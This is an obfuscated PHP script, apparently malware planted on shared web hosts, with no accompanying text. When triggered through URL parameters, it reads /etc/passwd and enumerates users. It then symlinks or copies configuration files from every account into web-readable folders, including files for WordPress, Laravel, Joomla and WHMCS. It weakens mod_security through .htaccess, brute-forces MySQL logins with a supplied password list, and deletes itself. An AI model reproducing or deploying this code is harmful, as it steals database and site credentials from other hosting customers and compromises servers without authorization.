<?php
 if(isset($_GET['Y'])){error_reporting(0);set_time_limit(0);@ini_set("disable_functions","");@ini_set("allow_url_fopen",1);@ini_set("memory_limit","512M");@ini_set("disable_functions","");function iCtDlvaCMMHs($_ilbB_Hkj,$duxgiRasAUYgg,$CGQQrRUzG){$XTIUvrWwwJ_=fopen($_ilbB_Hkj,$duxgiRasAUYgg);$pSVdawcdSi=fwrite($XTIUvrWwwJ_,$CGQQrRUzG);fclose($XTIUvrWwwJ_);if($pSVdawcdSi){return true;}else{return false;}}$bmoAhpyCR=array();$zBxbrAOd=array();$XTIUvrWwwJ_=fopen("/etc/passwd","r");while($YEmgxRfWI=fgets($XTIUvrWwwJ_)){$bmoAhpyCR[]=trim($YEmgxRfWI);}$LuOZvNpphT__=count($bmoAhpyCR);if($LuOZvNpphT__<65){if(function_exists('posix_getpwuid')){$zSOnVGX=$LuOZvNpphT__-1;$AjRzcaeJpOO=explode(":",$bmoAhpyCR[$zSOnVGX]);$Pofi_psncEI=intval($AjRzcaeJpOO[2]);$FzFN_HRhvL_l=$Pofi_psncEI >= 5000?$Pofi_psncEI-5000:1;$qYCmfrlWCV=$Pofi_psncEI >= 5000?$Pofi_psncEI+5000:$Pofi_psncEI+10000;while($FzFN_HRhvL_l<$qYCmfrlWCV){$zBxbrAOd=posix_getpwuid($FzFN_HRhvL_l);if($zBxbrAOd){$TuZiDUOvYAW=join(":",$zBxbrAOd);$zBxbrAOd[]=$TuZiDUOvYAW;}$FzFN_HRhvL_l++;}$KHmxqvLd=count($zBxbrAOd);if($KHmxqvLd>$LuOZvNpphT__){$bmoAhpyCR=$zBxbrAOd;}}}if(isset($_GET['CON'])){if(count($bmoAhpyCR)>0){if(isset($_SERVER['DOCUMENT_ROOT'])){$rTrGKqrlVo=get_current_user() or 'public_html';if($rTrGKqrlVo == 'public_html'){$POlhsyd='public_html';}elseif(strpos($_SERVER['DOCUMENT_ROOT'],$rTrGKqrlVo."/public_html")){$POlhsyd='public_html';}elseif(strpos($_SERVER['DOCUMENT_ROOT'],$rTrGKqrlVo."/www")){$POlhsyd='www';}elseif(strpos($_SERVER['DOCUMENT_ROOT'],"/home/".$rTrGKqrlVo)){$POlhsyd='public_html';}else{$POlhsyd=end(explode("/",$_SERVER['DOCUMENT_ROOT']));}}else{$POlhsyd='public_html';}$MmmOzGEfm=array("/.env" => "laravel","/application/config/config.php" => "codeigniter","/app/config/parameters.yml" => "symfony","/wp-config.php" => "wordpress","/configuration.php" => "joomla","/app/etc/local.xml" => "magento","/config/settings.inc.php" => "prestashop","/admin/config.php" => "opencart","/includes/config.php" => "vbulletin","/inc/config.php" => "mybb","/includes/configure.php" => "oscommerce","/inc/conf_global.php" => "ipb","/connect.php" => "fusion","/submitticket.php" => "whmcs","/WHMCS/configuration.php" => "whmcs","/host/configuration.php" => "whmcs","/whm/configuration.php" => "whmcs","/whmcs/configuration.php" => "whmcs","/clientarea/configuration.php" => "whmcs","/client/configuration.php" => "whmcs","/clients/configuration.php" => "whmcs","/clientarea/configuration.php" => "whmcs","/support/configuration.php" => "whmcs","/manage/configuration.php" => "whmcs","/hosting/configuration.php" => "whmcs","/sales/configuration.php" => "whmcs","/my/configuration.php" => "whmcs","/panel/configuration.php" => "whmcs","/order/configuration.php" => "whmcs","/orders/configuration.php" => "whmcs","/includes/dist-configure.php" => "zencart","/includes/iso4217.php" => "hostbills","../.accesshash" => "accesshash");$MunaN_KiZcsSv=array();foreach($bmoAhpyCR as $GPV_rwYmwz){$HQKWGxKExQL=explode(":",$GPV_rwYmwz);$qbOUc_aYttSF=$HQKWGxKExQL[0];$IgbFy_YYh=$HQKWGxKExQL[5];$MunaN_KiZcsSv[]=array($qbOUc_aYttSF,$IgbFy_YYh);}@mkdir('synz',0755);if(iCtDlvaCMMHs("synz/.htaccess","w","Options Indexes FollowSymLinks\nDirectoryIndex yes.htm\nAddType txt .php\nAddHandler txt .php\n<IfModule mod_autoindex.c>\nIndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble\n</ifModule>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>\nOptions +FollowSymLinks\nDirectoryIndex yess.html\nOptions +Indexes\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html") && iCtDlvaCMMHs("synz/test.gz","w","test")){foreach($MunaN_KiZcsSv as $MunaN_KiZcsSv){foreach($MmmOzGEfm as $zSOnVGX => $Df_hpkAejeNsn){@symlink($MunaN_KiZcsSv[1]."/".$POlhsyd.$zSOnVGX,'synz/'.$MunaN_KiZcsSv[0].'-'.$Df_hpkAejeNsn.'.txt');}}echo "synz=1;";}else{echo "synz=0;";}@mkdir('jmp',0755);if(iCtDlvaCMMHs("jmp/.htaccess","w","Options +Indexes\nDirectoryIndex blah.htm\nSatisfy Any") && iCtDlvaCMMHs("jmp/test.gz","w","test")){$bRhBlfSfG=0;foreach($MunaN_KiZcsSv as $MunaN_KiZcsSv){foreach($MmmOzGEfm as $zSOnVGX => $Df_hpkAejeNsn){if(is_readable($MunaN_KiZcsSv[1]."/".$POlhsyd.$zSOnVGX)){$_wKF_rFuSU=file_get_contents($MunaN_KiZcsSv[1]."/".$POlhsyd.$zSOnVGX);iCtDlvaCMMHs("jmp/".$MunaN_KiZcsSv[0]."-".$Df_hpkAejeNsn.".txt","w",$_wKF_rFuSU);$bRhBlfSfG += 1;}}}echo "jmp=1;";}else{echo "jmp=0;";}}else{echo "synz=0;jmp=0;";}}elseif(isset($_GET['BR'])){$JvSnreKK=explode(":::",$_POST['pasws']);$VpyOsJX=gethostbyname($_SERVER['HTTP_HOST']);foreach($bmoAhpyCR as $GPV_rwYmwz){$Pofi_psncEI=explode(":",$GPV_rwYmwz)[0];foreach($JvSnreKK as $bmoAhpyCR){$egEcfPSvkfYdB=mysqli_connect("localhost",$Pofi_psncEI,$bmoAhpyCR);if($egEcfPSvkfYdB){echo $_SERVER['HTTP_HOST']."|$VpyOsJX|$Pofi_psncEI|$bmoAhpyCR.=.";mysqli_close($egEcfPSvkfYdB);}}}unlink(__FILE__);}}
?>